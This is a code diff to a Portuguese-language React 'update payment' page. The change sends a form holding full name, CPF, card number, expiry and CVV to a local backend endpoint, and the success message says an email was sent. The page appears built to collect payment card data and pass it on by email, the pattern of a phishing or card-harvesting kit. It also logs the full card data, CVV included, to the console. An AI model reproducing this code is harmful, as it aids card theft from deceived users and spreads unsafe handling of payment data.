@@ -60,21 +60,52 @@ const Index = () => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    // Simula processamento
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    try {
+      // Connect to backend on port 5000 (safe port)
+      const backendUrl = 'http://localhost:5000';
 
-    toast.success('Pagamento atualizado com sucesso!', {
-      description: 'Seus dados foram salvos e criptografados.',
-    });
+      console.log('🔗 Enviando dados para:', backendUrl);
+      console.log('📦 Dados:', formData);
 
-    setIsSubmitting(false);
-    setFormData({
-      nomeCompleto: '',
-      cpf: '',
-      numeroCartao: '',
-      validade: '',
-      cvv: '',
-    });
+      const response = await fetch(`${backendUrl}/api/update-payment`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
+      });
+
+      console.log('📡 Status da resposta:', response.status);
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('❌ Erro do backend:', errorText);
+        throw new Error(`Erro ${response.status}: ${errorText}`);
+      }
+
+      const data = await response.json();
+      console.log('✅ Resposta do backend:', data);
+
+      toast.success('Pagamento atualizado com sucesso!', {
+        description: 'Seus dados foram salvos e e-mail enviado com sucesso.',
+      });
+
+      setFormData({
+        nomeCompleto: '',
+        cpf: '',
+        numeroCartao: '',
+        validade: '',
+        cvv: '',
+      });
+    } catch (error) {
+      const errorMessage = error instanceof Error ? error.message : 'Erro ao conectar com o backend';
+      console.error('❌ ERRO COMPLETO:', error);
+      toast.error('Erro ao processar', {
+        description: errorMessage,
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
